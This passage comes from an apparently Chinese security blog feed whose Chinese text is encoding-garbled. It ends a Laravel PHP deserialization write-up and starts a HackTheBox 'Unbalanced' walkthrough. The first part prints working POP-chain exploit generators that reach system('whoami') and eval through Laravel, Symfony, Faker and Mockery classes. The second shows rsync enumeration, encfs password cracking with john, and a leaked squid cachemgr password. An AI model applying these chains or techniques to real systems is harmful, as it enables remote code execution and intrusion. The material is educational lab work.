class="title">Generator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($format)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $format;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">fs</span> = <span class="title">array</span>("<span class="title">addCollection</span>"=&gt;"<span class="title">system</span>");</span><br><span class="line">    $gen = <span class="keyword">new</span> Faker\Generator($fs);</span><br><span class="line">    $pb = <span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($gen,<span class="string">"whoami"</span>);</span><br><span class="line">    <span class="keyword">echo</span>(urlencode(serialize($pb)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸éœ€è¦åœ¨æ„<code>ImportConfigurator</code>åŸæœ¬æ„é€ å‡½æ•°ä¸­ç»§æ‰¿å’Œå®šæ­»çš„ç±»å‹ã€‚å› ä¸ºæ˜¯ç›´æ¥è¿›è¡Œé“¾å¼è°ƒç”¨ã€‚</p><h3 id="popchain3"><a href="#popchain3" class="headerlink" title="popchain3"></a>popchain3</h3><p>å›åˆ°å¼€å§‹ã€‚æˆ‘ä»¬è¯´é™¤äº†ç”¨__callæ‰“ç»„åˆæ‹³ã€‚è¿˜å¯ä»¥æ‰¾æœ‰ç”¨çš„å…¨å±€æ‰¾å­˜åœ¨dispatchæ–¹æ³•ã€‚<br>æ¯”å¦‚src\Illuminate\Bus\Dispatcher.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatch</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;queueResolver &amp;&amp; <span class="keyword">$this</span>-&gt;commandShouldBeQueued($command)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchToQueue($command);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dispatchNow($command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">commandShouldBeQueued</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $command <span class="keyword">instanceof</span> ShouldQueue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dispatchToQueue</span><span class="params">($command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $connection = $command-&gt;connection ?? <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    $queue = call_user_func(<span class="keyword">$this</span>-&gt;queueResolver, $connection);</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>é¦–å…ˆifåˆ¤æ–­é‡Œè°ƒç”¨<code>commandShouldBeQueued</code>ã€‚ç„¶åè°ƒç”¨<code>dispatchToQueue</code>.<br>å¯ä»¥çœ‹åˆ°ã€‚<code>$command</code>åªè¦æ˜¯å®ç°ShouldQueueæ¥å£çš„ç±»å³å¯è¿›å…¥ä¸‹é¢,å­˜åœ¨call_user_funcçš„å‘½ä»¤è°ƒç”¨ã€‚</p><p>ç°åœ¨å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚é‚£å°±åªéœ€è¦æ‰¾ä¸€ä¸ªå¯ç”¨ç±»å³å¯ã€‚æ¯”å¦‚EvalLoader<br>ã€‚å…¶loadæ–¹æ³•å«æœ‰evalè¯­å¥.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EvalLoader</span> <span class="keyword">implements</span> <span class="title">Loader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span><span class="params">(MockDefinition $definition)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (class_exists($definition-&gt;getClassName(), <span class="keyword">false</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"?&gt;"</span> . $definition-&gt;getCode());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClassName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;config-&gt;getName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°åªè¦ä¿è¯<code>$this-&gt;config</code>çš„ç±»å­˜åœ¨getNameæ–¹æ³•ã€‚å°±å¯ä»¥è·³è¿‡returnæ‰§è¡Œeval.è¿™é‡Œé€‰æ‹©PhpParser\Node\Scalar\MagicConst\Lineç±»</p><p>exp3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    $mockdefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($line,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    $evalloader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($evalloader,<span class="string">'load'</span>));</span><br><span class="line">    $queuedcommand = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</span><br><span class="line">    $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingbroadcast));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/08/17/Laravel-popchain/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ²’æƒ³åˆ°ä¸€ä¸ªä¸‹åˆèƒ½æŠŠlaravelä¸»è¦çš„ä¸¤ä¸ªç‰ˆæœ¬ååºåˆ—åŒ–è·Ÿå®Œã€‚è¿˜æ˜¯æ”¶è·æŒºå¤§çš„ã€‚ä¸è¿‡å®æˆ˜ä¸­æƒ³é‡åˆ°laravelååºåˆ—åŒ–æ¯”è¾ƒå›°éš¾ã€‚ä½¿ç”¨pharæ¥è¿›è¡Œè§¦å‘åº”è¯¥æ˜¯æ¯”è¾ƒç†æƒ³çš„å¯èƒ½æ–¹å¼ã€‚åˆ°æ­¤phpååºåˆ—åŒ–å°±å‘Šä¸€æ®µè½äº†å§ã€‚å‰©ä¸‹çš„å‡æœŸå°±å¤ä¹ ä¹‹ä½™æŠ½ç©ºçœ‹javaäº†ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-Unbalanced</title>
      <link href="2020/08/15/hackthebox-Unbalanced/"/>
      <url>2020/08/15/hackthebox-Unbalanced/</url>
      
        <content type="html"><![CDATA[<p>  Unbalanced å¯èƒ½æ˜¯è‡ªå·±åšè¿‡çš„htbå›°éš¾é¶æœºä¸­é‡Œæœ€ç®€å•çš„ä¸€ä¸ªã€‚å…¶ä¸»è¦éš¾åº¦æ¥è‡ªäºæœ€å¼€å§‹çš„èµ·æ‰‹å¼éƒ¨åˆ†ã€‚æ¯”è¾ƒéœ€è¦è€å¿ƒ,ä½†æ˜¯æ²¡æœ‰éš¾åº¦ã€‚è€Œææƒéƒ¨åˆ†ç›´æ¥å¯ä»¥ç”¨ndayæ‰“ã€‚è¿™å¯¹äºä¸€ä¸ªå›°éš¾é¶æœºè€Œè¨€åŸºæœ¬å¤ªè¿‡ç®€å•äº†ã€‚æ‰€ä»¥åˆ°æ—¶ç®€å•åˆ†æä¸‹è¿™ä¸ªç”¨åˆ°çš„cveã€‚</p><a id="more"></a><p><img src="/2020/08/15/hackthebox-Unbalanced/head.PNG" class="lazyload" data-srcset="head.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><ul><li>é¶æœº 10.10.10.200</li><li>æ”»å‡»æœº 10.10.14.11</li></ul><h2 id="initial-foothold"><a href="#initial-foothold" class="headerlink" title="initial foothold"></a>initial foothold</h2><p>nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.80 scan initiated Fri Aug  7 11:01:56 2020 as: nmap -sC -sV -oA nmap/unbalance 10.10.10.200</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.200</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)</span><br><span class="line">|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)</span><br><span class="line">|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)</span><br><span class="line">873/tcp  open  rsync      (protocol version 31)</span><br><span class="line">3128/tcp open  http-proxy Squid http proxy 4.6</span><br><span class="line">|_http-server-header: squid/4.6</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Aug  7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds</span></span><br></pre></td></tr></table></figure><p>873æœ‰rsync.3128æœ‰squidã€‚æ—¢ç„¶rsyncå¼€æ”¾,åœ¨htbè¿™ç§ç¯å¢ƒé‡Œè‚¯å®šå­˜åœ¨æœªæˆæƒè®¿é—®çš„ã€‚æ‰€ä»¥æ¢æµ‹å¹¶ä¸‹è½½ä¸‹æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Unbalanced/<span class="comment"># rsync 10.10.10.200::</span></span><br><span class="line">conf_backups    EncFS-encrypted configuration backups</span><br><span class="line">root@byc404:~/htb/boxes/Unbalanced/<span class="comment"># rsync 192.168.122.1::conf_backups ./rsync_backup</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°conf_backupsæ–‡ä»¶å¤¹ã€‚çœ‹ä¸‹å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@byc404:~/htb/boxes/Unbalanced/rsync_backup<span class="comment"># ls -la</span></span><br><span class="line">-rw-r--r-- 1 root root   2980 Apr  4 23:05 A4qOD1nvqe9JgKnslwk1sUzO                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1138 Apr  4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    443 Apr  4 23:05 Acv0PEQX8vs-KdK307QNHaiF                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    935 Apr  4 23:05 B6J5M3OP0X7W25ITnaZX753T                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   3643 Apr  4 23:05 c9w3APbCYWfWLsq7NFOdjQpA                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root    288 Apr  4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1521 Apr  4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root    332 Apr  4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1                                                                                                   </span><br><span class="line">-rw-r--r-- 1 root root   2592 Apr  4 23:05 dF2GU58wFl3x5R7aDE6QEnDj                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1268 Apr  4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   2359 Apr  4 23:05 ECXONXBBRwhb5tYOIcjjFZzh                                                                                                                         </span><br><span class="line">-rw-r--r-- 1 root root   1297 Apr  2 21:06 .encfs6.xml                                                                                                                                      </span><br><span class="line">-rw-r--r-- 1 root root   1464 Apr  4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0     </span><br><span class="line">-rw-r--r-- 1 root root    354 Apr  4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>å‘ç°æ–‡ä»¶åä¼¼ä¹éƒ½æ˜¯å¤„ç†è¿‡çš„hashstring.æœ‰ä¸ª<code>.encfs6.xml</code>ä½†æ˜¯å†…å®¹çœ‹ä¸å‡ºä»€ä¹ˆæ•æ„Ÿæ•°æ®ã€‚</p><p>googleæœç´¢äº†ä¸‹å‘ç°è¿™æ˜¯encfsåŠ å¯†å¾—åˆ°é…ç½®æ–‡ä»¶ã€‚<code>encfs</code>åŠ å¯†çš„ç”¨æ³•ç®€å•æ¥è¯´,å°±æ˜¯ä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªè¢«åŠ å¯†çš„æ–‡ä»¶å¤¹,å†mountå¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä½œä¸ºåŠ å¯†æ–‡ä»¶å¤¹ã€‚æ‰§è¡Œencfså,è¢«åŠ å¯†çš„æ–‡ä»¶å¤¹çš„å†…å®¹ä»¥åŠæ–‡ä»¶åå°±åœ¨åŠ å¯†æ–‡ä»¶å¤¹å°±ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚æ­¤æ—¶åŠ å¯†æ–‡ä»¶å¤¹ä¼šç•™ä¸‹ä¸€ä¸ª<code>.encfs6.xml</code></p><p>è¿™ç§æƒ…å†µç»å¸¸å‡ºç°åœ¨ä½¿ç”¨è‡ªåŠ¨åŒæ­¥çš„æƒ…å†µé‡Œé¢ã€‚å› ä¸ºencfsä¸€æ—¦ä¸ºä¸¤ä¸ªæ–‡ä»¶å¤¹å»ºç«‹äº†æ˜ å°„,å°±ä¼šè‡ªåŠ¨åŠ å¯†æ–°æ”¾å…¥çš„æ–‡ä»¶ã€‚æ­£å› å¦‚æ­¤,ä½¿ç”¨rsyncå¤„ç†encfsåŠ å¯†åçš„æ–‡ä»¶å¤¹ä¹Ÿæ˜¯ä¸€ç§å¸¸è§é€‰æ‹©ã€‚è€Œä¸€æ—¦å‡ºç°äº†rsyncæœªæˆæƒè®¿é—®å°±å°†å¯¼è‡´è¿›ä¸€æ­¥çš„ä¿¡æ¯æ³„éœ²ã€‚å®æˆ˜ä¸­å®Œå…¨å¯èƒ½ã€‚</p><p>è‡³äºè§£å¯†æ–¹æ³•å…¶å®å®‰è£…äº†encfsåçœ‹ä¸€ä¸‹manå°±æ‡‚äº†ã€‚æˆ‘åœ¨<code>--reverse</code>çš„é€‰é¡¹é‚£çœ‹åˆ°äº†ä¸€ç§é€†å‘ä¸¤ä¸ªencfsæ–‡ä»¶å¤¹çš„åšæ³•ã€‚å› æ­¤åªéœ€è¦ä¸€ä¸ªæ­£ç¡®çš„encfs å¯†ç å³å¯ã€‚(encfsæ¯æ¬¡è°ƒç”¨åŠ å¯†å»ºç«‹æ˜ å°„æ—¶ä¼šè¦æ±‚ä½ è¾“å…¥å¯†ç )<br>æ¥ç€æŸ¥èµ„æ–™ã€‚æˆ‘å‘ç°encfså¦‚æœæœ‰<code>.encfs6.xml</code>çš„è¯ã€‚å¯ä»¥ç›´æ¥ä½¿ç”¨johnçˆ†ç ´<br><a href="https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml" target="_blank" rel="noopener">https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml</a></p><p>å…ˆä½¿ç”¨encfs2john.pyè½¬æ¢ã€‚ç„¶åçˆ†ç ´å³å¯</p><p>ç»“æœ<br><code>$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add:bubblegum</code></p><p>bubblegumå°±æ˜¯encfså¯†ç ã€‚<br>ç„¶åè§£å¯†æ–‡ä»¶å¤¹ã€‚æŠŠè§£å¯†çš„æ–‡ä»¶å¤¹æ”¾åˆ°<code>rsync_decrypt</code>é‡Œå»ã€‚æ³¨æ„è¿™é‡Œçš„è·¯å¾„åªæ¥å—ç»å¯¹è·¯å¾„ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è§£å¯†æ–‡ä»¶å¤¹åã€‚å‘ç°æœ‰å‡ åä¸ªconfæ–‡ä»¶ã€‚åŸºæœ¬å°±æ˜¯å¹³æ—¶ä¼šæ”¾åˆ°<code>/etc</code>ä¸‹çš„é‚£äº›<code>.conf</code>æ–‡ä»¶ã€‚</p><p>è¿™é‡Œæ˜æ˜¾éœ€è¦æŠ“é‡ç‚¹ã€‚åŸºäºä¹‹å‰æˆ‘ä»¬æ¢æµ‹æ—¶å‘ç°æœ‰squidä»£ç†å¼€æ”¾ã€‚æ‰€ä»¥æ‰¾åˆ°squid.confã€‚<br>squid.confåŒæ ·è¦æŠ“é‡ç‚¹ã€‚å› ä¸ºé‡Œé¢æœ‰ä¸Šåƒè¡Œå†…å®¹ã€‚æ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•æ˜¯ç›´æ¥<code>cat squid.conf| grep htb</code>æ‰¾åˆ°ä¸€ä¸ªåŸŸåã€‚æˆ–è€…åæ¥æˆ‘æ‹¿åˆ°æœ¬æœºä¸Šç”¨vscodeçœ‹æ—¶å› ä¸ºæ³¨é‡Šéƒ¨åˆ†è·Ÿæœªæ³¨é‡Šéƒ¨åˆ†æœ‰æ˜æ˜¾çš„ç»¿è‰²ä¸ç™½è‰²å·®åˆ«ã€‚æ‰€ä»¥å¯ä»¥å¾ˆå¿«æ‹–ç€çœ‹ã€‚æ‰¾åˆ°æ‰€æœ‰å…³é”®ä¿¡æ¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Only allow cachemgr access from localhost</span><br><span class="line">#http_access allow localhost manager</span><br><span class="line">#http_access deny manager</span><br><span class="line">http_access allow manager</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#http_access allow localnet</span><br><span class="line">http_access allow localhost</span><br><span class="line"></span><br><span class="line"># Allow access to intranet</span><br><span class="line">acl intranet dstdomain -n intranet.unbalanced.htb</span><br><span class="line">acl intranet_net dst -n 172.16.0.0&#x2F;12</span><br><span class="line">http_access allow intranet</span><br><span class="line">http_access allow intranet_net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># cachemgr_passwd secret shutdown</span><br><span class="line"># cachemgr_passwd lesssssssecret info stats&#x2F;objects</span><br><span class="line"># cachemgr_passwd disable all</span><br><span class="line">#Default:</span><br><span class="line"># No password. Actions which require password are denied.</span><br><span class="line">cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events</span><br><span class="line">cachemgr_passwd disable all</span><br></pre></td></tr></table></figure><p>å‡ ä¸ªå…³é”®ç‚¹ã€‚</p><ul><li><code>intranet.unbalanced.htb</code> åŸŸåã€‚ä¸è¿‡æ˜¯å†…ç½‘ip</li><li>cachemgr_passwd å³cache managerçš„å¯†ç 